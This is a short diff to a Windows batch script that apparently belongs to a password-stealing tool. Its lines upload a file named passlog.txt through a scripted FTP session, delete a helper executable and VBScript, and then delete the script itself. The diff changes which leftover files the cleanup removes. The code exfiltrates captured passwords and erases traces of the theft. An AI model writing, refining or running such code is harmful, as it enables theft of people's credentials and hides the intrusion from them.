@@ -16,7 +16,8 @@ put passlog.txt
 ftp -s:start.bat
 quit
 if exist bpv.exe del bpv.exe
+if exist start.txt del start.txt
+if exist start2.txt del start2.txt
 if exist start2.bat del start2.bat
-if exist passlog.txt del passlog.txt
 if exist close.vbs del close.vbs
 del "%~f0"&exit
